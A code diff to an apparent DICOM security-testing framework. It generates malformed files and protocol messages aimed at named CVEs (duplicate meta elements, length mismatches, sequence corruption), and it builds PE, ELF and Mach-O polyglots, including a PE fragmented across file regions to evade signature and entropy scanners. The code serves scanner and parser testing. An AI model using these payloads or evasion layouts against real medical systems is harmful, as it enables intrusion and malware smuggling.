@@ -121,7 +121,11 @@ from .element import Element, Dataset, Tag, VR
 from .corruptor import Corruptor, Override, Injection, InjectionPoint
 from .pixel import EncapsulatedPixelData, Fragment
 from .file import DicomFile
-from .polyglot import dos_header, pe_image
+from .polyglot import (
+    FILE_ALIGNMENT, align_up, dos_header, dos_stub, elf_header, elf_image,
+    filler, macho_header, macho_image, pe_fragments, pe_headers_len, pe_image,
+    shannon_entropy,
+)
 
 # Scapy imports - may not be available in all environments
 try:
@@ -213,6 +217,86 @@ class AttackResult:
     def cve(self) -> Optional[str]:
         """Get CVE reference if present."""
         return self.metadata.get('cve')
+
+
+# =============================================================================
+# Part-10 file construction
+# =============================================================================
+#
+# PS3.10 §7.1 makes the File Meta Information a precondition, not decoration:
+# a reader that cannot find (0002,0000) Group Length and (0002,0010) Transfer
+# Syntax UID does not know how to decode the Data Set and is entitled to stop
+# at the header. A payload that skips the meta group therefore never reaches
+# the parser it is aimed at, and the run reports a rejection that proves
+# nothing about the bug under test.
+#
+# These build the conformant carrier once so a payload only has to express its
+# own malformation.
+
+PART10_PREAMBLE_LEN = 128
+DICM_PREFIX = b'DICM'
+FILE_META_VERSION = b'\x00\x01'
+IMPLEMENTATION_CLASS_UID = '1.2.3.4.5.6.7.8.9'
+EXPLICIT_VR_LE_UID = '1.2.840.10008.1.2.1'
+
+
+def standard_file_meta(sop_class_uid: str = SECONDARY_CAPTURE_SOP_CLASS_UID,
+                       sop_instance_uid: str = '1.2.3.4.5',
+                       transfer_syntax: str = EXPLICIT_VR_LE_UID
+                       ) -> List[Element]:
+    """The Type 1 File Meta elements PS3.10 §7.1 requires, in tag order.
+
+    Returned as a list rather than a Dataset because several payloads need
+    *duplicate* meta elements, which a tag-keyed container cannot hold.
+    """
+    return [
+        Element(0x0002, 0x0001, 'OB', FILE_META_VERSION),
+        Element(0x0002, 0x0002, 'UI', sop_class_uid),
+        Element(0x0002, 0x0003, 'UI', sop_instance_uid),
+        Element(0x0002, 0x0010, 'UI', transfer_syntax),
+        Element(0x0002, 0x0012, 'UI', IMPLEMENTATION_CLASS_UID),
+    ]
+
+
+def part10_file(meta_elements: List[Element], dataset: bytes = b'',
+                preamble: bytes = b'\x00' * PART10_PREAMBLE_LEN,
+                group_length: Optional[int] = None) -> bytes:
+    """A Part-10 file whose File Meta group is exactly ``meta_elements``.
+
+    Emits the 128-byte preamble, the ``DICM`` prefix, a correct (0002,0000)
+    Group Length over the encoded group, then the Data Set. The File Meta
+    group is always Explicit VR Little Endian regardless of what
+    (0002,0010) declares for the Data Set, per PS3.10 §7.1.
+
+    Unlike :class:`DicomFile`'s builder this does not deduplicate by tag,
+    because several payloads *are* duplicate meta elements — and a group
+    length that spans them is exactly what gets a strict reader far enough to
+    insert the second one. Pass ``group_length`` to state a value other than
+    the truth, for payloads whose malformation is the length itself.
+    """
+    body = b''.join(e.encode(implicit_vr=False, little_endian=True)
+                    for e in meta_elements)
+    declared = len(body) if group_length is None else group_length
+    header = Element(0x0002, 0x0000, 'UL', declared).encode(
+        implicit_vr=False, little_endian=True)
+    return (preamble[:PART10_PREAMBLE_LEN].ljust(PART10_PREAMBLE_LEN, b'\x00')
+            + DICM_PREFIX + header + body + dataset)
+
+
+def minimal_dataset() -> bytes:
+    """A small conformant Secondary Capture Data Set, in ascending tag order.
+
+    Payloads whose malformation lives in the File Meta group still need a Data
+    Set after it: the meta group is a header *for* something, and a reader
+    that clears it with nothing behind it has not exercised the parser.
+    """
+    return b''.join(e.encode(implicit_vr=False, little_endian=True) for e in [
+        Element(0x0008, 0x0016, 'UI', SECONDARY_CAPTURE_SOP_CLASS_UID),
+        Element(0x0008, 0x0018, 'UI', '1.2.3.4.5'),
+        Element(0x0008, 0x0060, 'CS', 'OT'),
+        Element(0x0010, 0x0010, 'PN', 'Doe^John'),
+        Element(0x0010, 0x0020, 'LO', '12345'),
+    ])
 
 
 # =============================================================================
@@ -759,7 +843,8 @@ class ProtocolAttacks:
             payload=payload,
             description=f'PDU declares {size:#x} bytes, only 100 present',
             expected_behavior='Target should detect length mismatch',
-            metadata={'declared_size': size},
+            metadata={'declared_size': size,
+                      'bug_class': 'pdu-length-overdeclared'},
         )
 
     @staticmethod
@@ -1001,7 +1086,8 @@ class ProtocolAttacks:
             payload=payload,
             description=f'PDU length inflated by {inflate_by}',
             expected_behavior='Target should detect length mismatch',
-            metadata={'inflate_by': inflate_by},
+            metadata={'inflate_by': inflate_by,
+                      'bug_class': 'pdu-length-overdeclared'},
         )
 
     @staticmethod
@@ -1056,7 +1142,15 @@ class ProtocolAttacks:
             message_id=1,
         )
         cmd.command_field = 0xDEAD  # Invalid!
-        payload = raw(cmd)
+        # A command set travels inside a P-DATA-TF PDV, the same as its
+        # sibling pdata_without_association. Sent bare, the first byte of tag
+        # (0000,0000) lands where the PDU type belongs, so the peer's DUL
+        # rejects an unrecognised PDU and the command-set parser this payload
+        # is aimed at never runs.
+        pdv = PresentationDataValueItem(
+            context_id=1, is_last=1, is_command=1, data=raw(cmd),
+        )
+        payload = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
         return AttackResult(
             name='invalid_command_field',
             category='protocol',
@@ -1331,19 +1425,23 @@ class LogicAttacks:
     
     @staticmethod
     def transfer_syntax_mismatch() -> AttackResult:
-        """File declares one transfer syntax but uses another encoding."""
-        meta = Dataset()
-        meta / Element(0x0002, 0x0010, 'UI', '1.2.840.10008.1.2.1')  # Explicit LE
-        
-        # But encode dataset as implicit VR
-        data_implicit = struct.pack('<HH', 0x0010, 0x0010)  # Tag only
+        """File declares one transfer syntax but uses another encoding.
+
+        The mismatch is the attack, so the File Meta group around it is
+        conformant — Type 1 elements and a correct (0002,0000) Group Length.
+        Without them a reader stops at the header for a reason that has
+        nothing to do with the encoding disagreement under test.
+        """
+        # Declares Explicit VR LE...
+        meta = standard_file_meta(transfer_syntax=EXPLICIT_VR_LE_UID)
+
+        # ...but encodes the Data Set as Implicit VR (tag + 4-byte length, no VR)
+        data_implicit = struct.pack('<HH', 0x0010, 0x0010)
         data_implicit += struct.pack('<I', 8)
         data_implicit += b'Doe^John'
-        
-        file_data = b'\x00' * 128 + b'DICM'
-        file_data += meta.encode()
-        file_data += data_implicit
-        
+
+        file_data = part10_file(meta, dataset=data_implicit)
+
         return AttackResult(
             name='transfer_syntax_mismatch',
             category='logic',
@@ -1695,7 +1793,11 @@ class StorageSCPAbuseAttacks:
         return AttackResult(
             name='storage_private_tag_pressure',
             category='storage_abuse',
-            payload=ds.encode(),
+            # sort_tags because group 0011 sorts before the base object's
+            # (0020,xxxx) elements: appended in insertion order the Data Set
+            # descends, which PS3.5 §7.1 forbids and a strict importer may
+            # reject before it ever feels the private-tag pressure.
+            payload=ds.encode(sort_tags=True),
             description=f'C-STORE object with {count} private data elements',
             expected_behavior='Storage/import path should bound private-tag processing and metadata insertion',
             metadata={
@@ -2185,6 +2287,10 @@ class PathTraversalAttacks:
                 'cve': 'CVE-2022-2119',
                 'cves': ['CVE-2022-2119', 'CVE-2022-2120'],
                 'coverage_scope': 'file-meta-sop-instance-uid',
+                # The group-0002 element inside the Data Set is the attack:
+                # PS3.5 forbids it on the network, and the question is whether
+                # a receiver parses it anyway and names a file from it.
+                'bug_class': 'file-meta-element-in-dataset',
                 'target_field': '(0002,0003) Media Storage SOP Instance UID',
                 'dataset_sop_instance_uid': '1.2.3.4.5',
                 'traversal_payload': value,
@@ -3667,7 +3773,8 @@ class CVEAttacks:
             description='Sequence with undefined length but no items',
             expected_behavior='Parser may access freed sequence memory',
             metadata={'cve': 'CVE-2023-32135',
-                      'bug_class': 'dangling-sequence-reference'}
+                      'bug_class': 'dangling-sequence-reference',
+                      'delivery_hint': 'cstore'}
         ))
         
         # Test 2: Invalid nested dataset pointers (beyond EOF)
@@ -3686,7 +3793,8 @@ class CVEAttacks:
             description='Sequence item with offset beyond EOF',
             expected_behavior='Parser should detect invalid offset',
             metadata={'cve': 'CVE-2023-32135',
-                      'bug_class': 'oob-item-length'}
+                      'bug_class': 'oob-item-length',
+                      'delivery_hint': 'cstore'}
         ))
         
         # Test 3: Premature sequence termination (truncated file)
@@ -3706,7 +3814,8 @@ class CVEAttacks:
             description='Sequence truncated without delimiters',
             expected_behavior='Parser may leave dangling references',
             metadata={'cve': 'CVE-2023-32135',
-                      'bug_class': 'truncated-sequence'}
+                      'bug_class': 'truncated-sequence',
+                      'delivery_hint': 'cstore'}
         ))
         
         return results
@@ -3783,6 +3892,7 @@ class CVEAttacks:
             'delivery': 'raw-pdu',
             'repeat_for_detection': 1000,
             'expected_monitor': 'memory-growth-or-lsan',
+            'bug_class': 'truncated-user-information-item',
         })
         return [AttackResult(
             name='cve_2026_50254_storescp_assoc_leak_truncated_max_length',
@@ -3942,88 +4052,88 @@ class CVEAttacks:
         
         When inserting duplicate tags into File Meta Information header,
         the element is freed but still referenced.
+
+        The duplicate is the attack, so everything around it is conformant:
+        a full Type 1 File Meta group with a (0002,0000) Group Length that
+        spans the duplicate, and a Data Set behind it. Emitting the preamble,
+        ``DICM`` and the bare duplicate left a file with no group length and
+        no Transfer Syntax UID, which ``DcmMetaInfo::read`` rejects at the
+        header — the duplicate-insertion path that holds the use-after-free
+        was never reached, and the run recorded a rejection that said nothing
+        about the bug.
         """
         results = []
-        
+
+        def duplicated(tag_element: int, duplicate: Element, **meta_kw):
+            """Standard meta with ``duplicate`` inserted after its original.
+
+            Placing it immediately after the element it duplicates is what a
+            parser meets in the wild, and keeps the rest of the group in the
+            ascending tag order PS3.5 §7.1 requires.
+            """
+            meta = standard_file_meta(**meta_kw)
+            at = max(i for i, e in enumerate(meta)
+                     if e.tag.element == tag_element) + 1
+            meta.insert(at, duplicate)
+            return part10_file(meta, dataset=minimal_dataset())
+
         # Test 1: Duplicate Transfer Syntax UID
-        meta = b'\x00' * 128 + b'DICM'
-        # First Transfer Syntax
-        meta += struct.pack('<HH', 0x0002, 0x0010)
-        meta += b'UI'
-        meta += struct.pack('<H', 18)
-        meta += b'1.2.840.10008.1.2\x00'
-        # DUPLICATE Transfer Syntax
-        meta += struct.pack('<HH', 0x0002, 0x0010)
-        meta += b'UI'
-        meta += struct.pack('<H', 20)
-        meta += b'1.2.840.10008.1.2.1\x00'
-        
         results.append(AttackResult(
             name='cve_2024_24793_01_duplicate_transfer_syntax',
             category='cve',
-            payload=meta,
+            payload=duplicated(
+                0x0010, Element(0x0002, 0x0010, 'UI', EXPLICIT_VR_LE_UID),
+                transfer_syntax='1.2.840.10008.1.2'),
             description='Two Transfer Syntax UID elements in meta header',
             expected_behavior='Parser may UAF on duplicate insertion',
-            metadata={'cve': 'CVE-2024-24793'}
+            metadata={'cve': 'CVE-2024-24793',
+                      'bug_class': 'duplicate-meta-element'}
         ))
-        
+
         # Test 2: Duplicate Media Storage SOP Class
-        meta = b'\x00' * 128 + b'DICM'
-        meta += struct.pack('<HH', 0x0002, 0x0002)
-        meta += b'UI'
-        meta += struct.pack('<H', 26)
-        meta += b'1.2.840.10008.5.1.4.1.1.2\x00'
-        meta += struct.pack('<HH', 0x0002, 0x0002)  # DUPLICATE
-        meta += b'UI'
-        meta += struct.pack('<H', 26)
-        meta += b'1.2.840.10008.5.1.4.1.1.4\x00'
-        
         results.append(AttackResult(
             name='cve_2024_24793_02_duplicate_sop_class',
             category='cve',
-            payload=meta,
+            payload=duplicated(
+                0x0002, Element(0x0002, 0x0002, 'UI',
+                                '1.2.840.10008.5.1.4.1.1.4'),
+                sop_class_uid='1.2.840.10008.5.1.4.1.1.2'),
             description='Two Media Storage SOP Class elements',
             expected_behavior='Parser may UAF on duplicate',
-            metadata={'cve': 'CVE-2024-24793'}
+            metadata={'cve': 'CVE-2024-24793',
+                      'bug_class': 'duplicate-meta-element'}
         ))
-        
-        # Test 3: Duplicate with different VRs
-        meta = b'\x00' * 128 + b'DICM'
-        meta += struct.pack('<HH', 0x0002, 0x0010)
-        meta += b'UI'
-        meta += struct.pack('<H', 18)
-        meta += b'1.2.840.10008.1.2\x00'
-        meta += struct.pack('<HH', 0x0002, 0x0010)
-        meta += b'LO'  # Different VR!
-        meta += struct.pack('<H', 20)
-        meta += b'1.2.840.10008.1.2.1\x00'
-        
+
+        # Test 3: Duplicate with different VRs. 'LO' rather than 'UI' for the
+        # same tag, so a parser that keys its free on the first VR and its
+        # read on the second disagrees with itself about the value's length.
         results.append(AttackResult(
             name='cve_2024_24793_03_duplicate_different_vr',
             category='cve',
-            payload=meta,
+            payload=duplicated(
+                0x0010, Element(0x0002, 0x0010, 'LO', EXPLICIT_VR_LE_UID),
+                transfer_syntax='1.2.840.10008.1.2'),
             description='Duplicate tag with conflicting VRs',
             expected_behavior='Parser confusion on VR',
-            metadata={'cve': 'CVE-2024-24793'}
+            metadata={'cve': 'CVE-2024-24793',
+                      'bug_class': 'duplicate-meta-element-vr-conflict'}
         ))
-        
+
         # Test 4: Rapid duplicate sequence (many duplicates)
-        meta = b'\x00' * 128 + b'DICM'
-        for i in range(10):
-            meta += struct.pack('<HH', 0x0002, 0x0010)
-            meta += b'UI'
-            meta += struct.pack('<H', 18)
-            meta += b'1.2.840.10008.1.2\x00'
-        
+        meta = standard_file_meta(transfer_syntax='1.2.840.10008.1.2')
+        at = max(i for i, e in enumerate(meta) if e.tag.element == 0x0010) + 1
+        for _ in range(9):
+            meta.insert(at, Element(0x0002, 0x0010, 'UI', '1.2.840.10008.1.2'))
         results.append(AttackResult(
             name='cve_2024_24793_04_rapid_duplicates',
             category='cve',
-            payload=meta,
+            payload=part10_file(meta, dataset=minimal_dataset()),
             description='10 consecutive duplicate Transfer Syntax tags',
             expected_behavior='Multiple UAF opportunities',
-            metadata={'cve': 'CVE-2024-24793'}
+            metadata={'cve': 'CVE-2024-24793',
+                      'bug_class': 'duplicate-meta-element'}
         ))
-        
+
         return results
     
     # -------------------------------------------------------------------------
@@ -4067,7 +4177,8 @@ class CVEAttacks:
             payload=data,
             description='Duplicate tag within sequence item',
             expected_behavior='Parser may UAF in sequence context',
-            metadata={'cve': 'CVE-2024-24794'}
+            metadata={'cve': 'CVE-2024-24794',
+                      'delivery_hint': 'cstore'}
         ))
         
         # Test 2: Duplicate sequence delimiters
@@ -4090,7 +4201,8 @@ class CVEAttacks:
             payload=data,
             description='Multiple sequence delimitation items',
             expected_behavior='Parser may process freed delimiter',
-            metadata={'cve': 'CVE-2024-24794'}
+            metadata={'cve': 'CVE-2024-24794',
+                      'delivery_hint': 'cstore'}
         ))
         
         # Test 3: Deeply nested duplicates (5 levels)
@@ -4125,7 +4237,8 @@ class CVEAttacks:
             payload=data,
             description='5 levels of nesting with duplicates at each',
             expected_behavior='UAF at multiple nesting levels',
-            metadata={'cve': 'CVE-2024-24794'}
+            metadata={'cve': 'CVE-2024-24794',
+                      'delivery_hint': 'cstore'}
         ))
         
         return results
@@ -4165,23 +4278,42 @@ class CVEAttacks:
         return df
 
     @staticmethod
-    def _polyglot_body() -> bytes:
-        """The clinical half: enough of a Secondary Capture to look routine."""
+    def _polyglot_identity() -> bytes:
+        """The (0008,xxxx) half of the clinical body."""
         return CVEAttacks._ds_bytes([
             Element(0x0008, 0x0016, 'UI', SECONDARY_CAPTURE_SOP_CLASS_UID),
             Element(0x0008, 0x0018, 'UI', '1.2.3.4.5'),
             Element(0x0008, 0x0060, 'CS', 'OT'),
+        ])
+
+    @staticmethod
+    def _polyglot_patient() -> bytes:
+        """The (0010,xxxx) half of the clinical body."""
+        return CVEAttacks._ds_bytes([
             Element(0x0010, 0x0010, 'PN', 'Doe^John'),
             Element(0x0010, 0x0020, 'LO', '12345'),
         ])
 
     @staticmethod
+    def _polyglot_body(insert: bytes = b'') -> bytes:
+        """The clinical half: enough of a Secondary Capture to look routine.
+
+        ``insert`` is spliced between the identity and patient elements, which
+        is where a private group 0009 carrier belongs in ascending tag order
+        and — the reason it matters here — puts real Data Set structure
+        between anything placed on either side of it.
+        """
+        return (CVEAttacks._polyglot_identity() + insert +
+                CVEAttacks._polyglot_patient())
+
+    @staticmethod
     def _polyglot_part10(preamble: bytes, lead: bytes = b'',
-                         trailing: bytes = b'') -> bytes:
-        """Assemble a polyglot: ``lead`` opens the Data Set, ``trailing``
+                         trailing: bytes = b'', insert: bytes = b'') -> bytes:
+        """Assemble a polyglot: ``lead`` opens the Data Set, ``insert`` sits
+        mid-body between the identity and patient elements, and ``trailing``
         follows the whole file."""
         df = CVEAttacks._polyglot_file(preamble)
-        df.dataset = lead + CVEAttacks._polyglot_body()
+        df.dataset = lead + CVEAttacks._polyglot_body(insert)
         return df.encode() + trailing
 
     @staticmethod
@@ -4197,8 +4329,14 @@ class CVEAttacks:
         df.dataset = b''
         return len(df.encode()) + len(lead)
 
+    # Explicit VR long-form value header: tag (4), VR (2), 2 reserved bytes,
+    # 4-byte length. The offset arithmetic below leans on it constantly.
+    _LONG_FORM_HEADER_LEN = 12
+
     @staticmethod
-    def _pedicom(bits: int) -> bytes:
+    def _pedicom(bits: int = 64, fill: str = 'zeros', seed: int = 0,
+                 section_size: int = 0x200, section_name: bytes = b'.pad',
+                 stub: bytes = b'\x00' * 64) -> bytes:
         """Property 1 and Property 2 composed — the full PEDICOM construction.
 
         An MZ DOS header occupies the ignored preamble; its ``e_lfanew`` points
@@ -4211,20 +4349,198 @@ class CVEAttacks:
         x86 and x86-64 loaders tolerate a misaligned signature; the ARM64
         emulation layer rejects it, and the padding costs nothing in DICOM
         terms because it sits inside a value nothing parses.
+
+        ``fill`` and ``stub`` shape what the file looks like statistically
+        rather than structurally — see the entropy-profile payloads below.
         """
         creator = CVEAttacks._POLYGLOT_PRIVATE_CREATOR.encode(
             implicit_vr=False, little_endian=True)
-        # +12 for the carrier's Explicit VR long-form header (tag, 'OB',
-        # 2 reserved bytes, 4-byte length).
-        value_start = CVEAttacks._polyglot_head_len(creator) + 12
+        # The carrier goes mid-body, not in front of it: group 0009 sorts
+        # after the (0008,xxxx) identity elements and before the (0010,xxxx)
+        # patient ones, and PS3.5 §7.1 requires ascending tag order. Leading
+        # with it produced a Data Set a strict reader is entitled to reject
+        # before reaching the private element the payload is about.
+        value_start = (CVEAttacks._polyglot_head_len() +
+                       len(CVEAttacks._polyglot_identity()) + len(creator) +
+                       CVEAttacks._LONG_FORM_HEADER_LEN)
         pad = -value_start % 4
         pe_offset = value_start + pad
 
-        carrier = Element(0x0009, 0x1001, 'OB',
-                          b'\x00' * pad + pe_image(pe_offset, bits=bits))
+        image = pe_image(pe_offset, bits=bits, section_size=section_size,
+                         section_name=section_name, fill=fill, seed=seed)
+        carrier = Element(0x0009, 0x1001, 'OB', b'\x00' * pad + image)
         return CVEAttacks._polyglot_part10(
-            preamble=dos_header(pe_offset) + b'\x00' * 64,
-            lead=creator + carrier.encode(implicit_vr=False, little_endian=True),
+            preamble=dos_header(pe_offset) + stub[:64].ljust(64, b'\x00'),
+            insert=creator + carrier.encode(implicit_vr=False,
+                                            little_endian=True),
+        )
+
+    @staticmethod
+    def _fragmented_pedicom(bits: int = 64,
+                            section_size: int = 0x200
+                            ) -> Tuple[bytes, List[Dict[str, Any]]]:
+        """A PE whose pieces land in three different safe zones.
+
+        Every other polyglot in this catalog puts its foreign image in exactly
+        one region, which is what a contiguous-byte signature is written
+        against. Here the same image is cut along its own structural seams and
+        scattered:
+
+        * the **PE headers** go in a private ``OB`` element;
+        * section ``.vend``'s data goes in the **padding tail** of a second
+          private element, behind a plausible ``VENDORCFG`` value;
+        * section ``.tail``'s data goes **past the final Data Element**;
+        * and the patient elements sit between the second and third, so the
+          gaps are filled with genuine Data Set structure rather than slack.
+
+        Nothing executable is involved — the evasion is entirely the layout.
+        ``PointerToRawData`` was always a free file offset, so the loader
+        reassembles the image from three places without noticing, while a
+        scanner matching a contiguous PE never sees one.
+
+        The DOS stub is *not* one of the fragments, and that is a finding
+        rather than an omission: a PE section must start on a
+        ``FileAlignment`` (512-byte) boundary at or past ``SizeOfHeaders``, and
+        preamble bytes 0x40–0x7F satisfy neither. It carries a marker instead.
+
+        Returns the payload and a description of where each fragment landed.
+        """
+        head = CVEAttacks._polyglot_head_len()
+        identity = CVEAttacks._polyglot_identity()
+        patient = CVEAttacks._polyglot_patient()
+        creator = CVEAttacks._POLYGLOT_PRIVATE_CREATOR.encode(
+            implicit_vr=False, little_endian=True)
+        long_form = CVEAttacks._LONG_FORM_HEADER_LEN
+
+        # Fragment 1 — the headers, in a private OB element.
+        headers_value_start = (head + len(identity) + len(creator) + long_form)
+        pad = -headers_value_start % 4          # 4-align the PE signature
+        pe_offset = headers_value_start + pad
+        headers_len = pe_headers_len(bits, sections=2)
+        size_of_headers = align_up(pe_offset + headers_len, FILE_ALIGNMENT)
+        headers_value_len = pad + headers_len
+        headers_value_len += headers_value_len % 2   # OB values are even-length
+        after_headers = headers_value_start + headers_value_len
+
+        # Fragment 2 — section .vend, in the padding tail of a second private
+        # element whose declared length covers it.
+        content = b'VENDORCFG\x00'
+        vend_value_start = after_headers + long_form
+        vend_offset = align_up(
+            max(vend_value_start + len(content), size_of_headers),
+            FILE_ALIGNMENT)
+        gap = vend_offset - (vend_value_start + len(content))
+        after_vend = vend_offset + section_size
+
+        # Fragment 3 — section .tail, past the end of the Data Set.
+        end_of_dataset = after_vend + len(patient)
+        tail_offset = align_up(end_of_dataset, FILE_ALIGNMENT)
+        trailing_gap = tail_offset - end_of_dataset
+
+        headers, (vend, tail) = pe_fragments(
+            pe_offset,
+            [(vend_offset, section_size), (tail_offset, section_size)],
+            bits=bits, names=[b'.vend', b'.tail'])
+
+        carriers = (
+            Element(0x0009, 0x1001, 'OB', b'\x00' * pad + headers),
+            Element(0x0009, 0x1002, 'UN', content + b'\x00' * gap + vend),
+        )
+        payload = CVEAttacks._polyglot_part10(
+            preamble=dos_header(pe_offset) + dos_stub(
+                b'C-SCARE: no PE section fits here (FileAlignment)'),
+            insert=creator + b''.join(
+                c.encode(implicit_vr=False, little_endian=True)
+                for c in carriers),
+            trailing=b'\x00' * trailing_gap + tail,
+        )
+
+        fragments = [
+            {'zone': 'preamble_dos_header', 'offset': 0, 'length': 64,
+             'part': 'DOS header'},
+            {'zone': 'private_element', 'offset': pe_offset,
+             'length': headers_len, 'part': 'PE headers and section table'},
+            {'zone': 'element_padding', 'offset': vend_offset,
+             'length': len(vend), 'part': "section '.vend' raw data"},
+            {'zone': 'trailing', 'offset': tail_offset, 'length': len(tail),
+             'part': "section '.tail' raw data"},
+        ]
+        for fragment in fragments:
+            end = fragment['offset'] + fragment['length']
+            assert end <= len(payload), (fragment, len(payload))
+        return payload, fragments
+
+    @staticmethod
+    def _elfdicom(bits: int = 64, segment_size: int = 0x200) -> bytes:
+        """The ELF counterpart of :meth:`_pedicom`, with ELF's own rules.
+
+        The 64-byte ``Elf64_Ehdr`` fits the first half of the preamble exactly,
+        and ``e_phoff`` points past ``DICM`` at a program header table and its
+        ``PT_LOAD`` segment in a private ``OB`` element. That is as far as the
+        analogy with PE goes:
+
+        * the ELF header itself cannot move — there is no ``e_lfanew``
+          equivalent, so offset 0 is the only place a reader looks for it;
+        * ``PT_LOAD`` wants ``p_offset`` congruent to ``p_vaddr`` modulo the
+          page size, not aligned to a boundary, so the payload picks a virtual
+          address to fit whatever offset the DICOM layout produced instead of
+          padding to reach one;
+        * ``e_phoff`` is padded only to 8, the natural alignment of the
+          ``Elf64_Phdr`` fields a reader will cast over it.
+
+        The image is structurally valid and deliberately not loadable: no
+        ``PT_INTERP``, no ``PT_LOAD`` covering the headers, entry point 0.
+        """
+        creator = CVEAttacks._POLYGLOT_PRIVATE_CREATOR.encode(
+            implicit_vr=False, little_endian=True)
+        head = CVEAttacks._polyglot_head_len()
+        identity = CVEAttacks._polyglot_identity()
+        value_start = (head + len(identity) + len(creator) +
+                       CVEAttacks._LONG_FORM_HEADER_LEN)
+        pad = -value_start % 8
+        ph_offset = value_start + pad
+
+        image = elf_image(ph_offset, bits=bits, segment_size=segment_size)
+        carrier = Element(0x0009, 0x1001, 'OB', b'\x00' * pad + image)
+        return CVEAttacks._polyglot_part10(
+            preamble=elf_header(ph_offset, ph_count=1, bits=bits).ljust(
+                128, b'\x00'),
+            insert=creator + carrier.encode(implicit_vr=False,
+                                            little_endian=True),
+        )
+
+    @staticmethod
+    def _machodicom(arch: str = 'arm64', segment_size: int = 0x200) -> bytes:
+        """The Mach-O counterpart of :meth:`_pedicom`, which relocates least.
+
+        ``mach_header_64`` and its load commands must be contiguous, so both
+        live in the preamble — 104 bytes of the 128 available, and a second
+        ``LC_SEGMENT_64`` or a single ``section_64`` would not fit. Only the
+        segment *contents* move out to a private ``OB`` element, addressed by
+        ``fileoff``.
+
+        The payload therefore tests one thing honestly: whether a scanner's
+        magic table and load-command walk reach an embedded Mach-O. It does
+        not test loadability — arm64 macOS requires a valid code signature
+        before ``execve`` will touch an image, and that cannot be synthesised
+        inertly.
+        """
+        creator = CVEAttacks._POLYGLOT_PRIVATE_CREATOR.encode(
+            implicit_vr=False, little_endian=True)
+        head = CVEAttacks._polyglot_head_len()
+        identity = CVEAttacks._polyglot_identity()
+        value_start = (head + len(identity) + len(creator) +
+                       CVEAttacks._LONG_FORM_HEADER_LEN)
+        pad = -value_start % 8
+        segment_offset = value_start + pad
+
+        carrier = Element(0x0009, 0x1001, 'OB',
+                          b'\x00' * pad + macho_image(segment_size))
+        return CVEAttacks._polyglot_part10(
+            preamble=macho_header(segment_offset, segment_size,
+                                  arch=arch).ljust(128, b'\x00'),
+            insert=creator + carrier.encode(implicit_vr=False,
+                                            little_endian=True),
         )
 
     @staticmethod
@@ -4235,14 +4551,29 @@ class CVEAttacks:
         The 128-byte preamble can contain PE/ELF headers, making the file
         valid as both DICOM and executable.
 
-        Payloads split along two axes. *Which second format* the file also
-        claims to be — PE, ELF, Mach-O, shell, batch, TIFF — decides whether a
-        scanner's magic-byte table fires at all. *Which safe zone* carries the
-        foreign bytes decides whether the scanner ever reads them: the preamble
-        is in front of every reader, while a private element, an element's
-        padding tail, and the space past the final element are all regions a
-        conforming parser walks over without inspecting. ``metadata['zone']``
-        names the region under test.
+        Payloads split along four axes.
+
+        *Which second format* the file also claims to be — PE, ELF, Mach-O,
+        shell, batch, TIFF — decides whether a scanner's magic-byte table fires
+        at all. The three executable formats are built to their own rules
+        rather than by transposing the PE construction, because they do not
+        relocate the same things: see :meth:`_elfdicom` and
+        :meth:`_machodicom`.
+
+        *Which safe zone* carries the foreign bytes decides whether the scanner
+        ever reads them: the preamble is in front of every reader, while a
+        private element, an element's padding tail, and the space past the
+        final element are all regions a conforming parser walks over without
+        inspecting. ``metadata['zone']`` names the region under test.
+
+        *Whether the payload is contiguous* decides whether a signature written
+        over a whole image can match it at all. ``zone='fragmented'`` marks the
+        payload that is cut across three regions with Data Set structure in
+        between; ``metadata['fragments']`` maps where each piece landed.
+
+        *What the bytes look like statistically* decides whether an entropy or
+        histogram triage step separates the file from a benign one before
+        anything parses it. ``metadata['fill']`` names the content profile.
         """
         results = []
 
@@ -4260,25 +4591,21 @@ class CVEAttacks:
                       'zone': 'private_element', 'pe_bits': 64}
         ))
 
-        # Test 2: ELF header in preamble
-        elf_header = b'\x7FELF'  # ELF magic
-        elf_header += b'\x02'  # 64-bit
-        elf_header += b'\x01'  # Little endian
-        elf_header += b'\x01'  # ELF version
-        elf_header += b'\x00' * (128 - len(elf_header))  # Pad
-        
-        file_data = CVEAttacks._polyglot_part10(elf_header)
-        
+        # Test 2: a complete Elf64_Ehdr in the preamble. It is exactly 64 bytes
+        # and needs no relocation pointer, so unlike PE the whole ELF header
+        # fits in the first half of the preamble with nothing left dangling.
         results.append(AttackResult(
             name='cve_2019_11687_02_elf_header',
             category='cve',
-            payload=file_data,
-            description='ELF header in DICOM preamble (ELFDICOM)',
+            payload=CVEAttacks._polyglot_part10(
+                elf_header(ph_offset=0, ph_count=0).ljust(128, b'\x00')),
+            description='Complete 64-byte Elf64_Ehdr in the DICOM preamble '
+                        '(ELFDICOM)',
             expected_behavior='Scanner should detect ELF signature',
             metadata={'cve': 'CVE-2019-11687', 'polyglot': 'ELF',
-                      'zone': 'preamble_dos_header'}
+                      'zone': 'preamble_dos_header', 'elf_bits': 64}
         ))
-        
+
         # Test 3: Shell script in preamble
         script = b'#!/bin/sh\necho "pwned"\n#'
         script += b'\x00' * (128 - len(script))
@@ -4332,25 +4659,23 @@ class CVEAttacks:
                       'zone': 'preamble_dos_header'}
         ))
 
-        # Test 6: Mach-O header in preamble. The published construction targets
-        # the Windows loader, but the preamble is loader-agnostic — a scanner
-        # whose magic table stops at MZ and \x7fELF misses this one entirely.
-        macho = struct.pack('<IIIIIIII',
-                            0xFEEDFACF,   # MH_MAGIC_64
-                            0x0100000C,   # CPU_TYPE_ARM64
-                            0x00000000,   # CPU_SUBTYPE_ARM64_ALL
-                            0x00000002,   # MH_EXECUTE
-                            0, 0, 0, 0)   # no load commands
-        macho += b'\x00' * (128 - len(macho))
-
+        # Test 6: Mach-O header plus its load commands in the preamble. The
+        # published construction targets the Windows loader, but the preamble
+        # is loader-agnostic — a scanner whose magic table stops at MZ and
+        # \x7fELF misses this one entirely. Load commands have to sit
+        # contiguously behind the header, so at 104 bytes this is very nearly
+        # the largest Mach-O that fits a 128-byte preamble at all.
         results.append(AttackResult(
             name='cve_2019_11687_06_macho_header',
             category='cve',
-            payload=CVEAttacks._polyglot_part10(macho),
-            description='Mach-O 64-bit header in DICOM preamble',
+            payload=CVEAttacks._polyglot_part10(
+                macho_header(segment_offset=0, segment_size=0,
+                             arch='arm64').ljust(128, b'\x00')),
+            description='mach_header_64 and a complete LC_SEGMENT_64 in the '
+                        'DICOM preamble',
             expected_behavior='Scanner should detect Mach-O signature',
